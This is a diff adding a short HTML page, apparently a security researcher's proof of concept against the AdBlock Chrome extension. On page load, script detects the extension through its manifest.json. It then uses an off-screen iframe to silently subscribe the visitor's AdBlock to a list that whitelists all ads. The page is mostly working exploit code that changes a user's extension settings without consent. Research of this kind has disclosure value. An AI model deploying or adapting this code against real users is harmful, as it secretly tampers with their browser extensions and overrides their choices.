@@ -1,0 +1,41 @@
+<html>
+<head>
+<script>
+var addon_id = 'gighmmpiobklfepjocnamgkkbiglidom';
+
+var detect = function(base, if_installed, if_not_installed) {
+    var s = document.createElement('script');
+    s.onerror = if_not_installed;
+    s.onload = if_installed;
+    document.head.appendChild(s);
+    s.src = base + '/manifest.json';
+}
+
+function pwnAdblock() {
+    // quietly subscribe to my list whitelisting everything
+    document.getElementById('abp').src = 'chrome-extension://'+addon_id + '/pages/subscribe.html?location=' + location.href.replace('disable.html', 'list.txt');
+    setTimeout(function() { document.getElementById('complete').style.display = 'block'}, 2000);
+}
+
+document.addEventListener("DOMContentLoaded", function() {
+    detect('chrome-extension://' + addon_id, function() {
+        pwnAdblock();
+    }, function () { alert('sorry, no AdBlock chrome addon is installed.');});
+   
+}, false);
+
+</script>
+</head>
+<body>
+<h1>Chrome Ad(block)^2</h1>
+<p>By <a rel=me href="http://blog.kotowicz.net">Krzysztof Kotowicz</a>
+<p>This page will quietly subscribe your AdBlock to a list whitelisting all adds on all domains
+<p>See also: <a href="bypass.html">Chrome AdBlock bypass</a>
+<iframe style="position:absolute;left:-1000px;" id="abp" src=""></iframe>
+<p id=complete style=display:none>
+Adblock detected & disabled.
+<br />
+<a href="http://imageshack.us/f/69/welcometotheworldoftomo.jpg/">See for yourself!</a>
+</p>
+</body>
+</html>
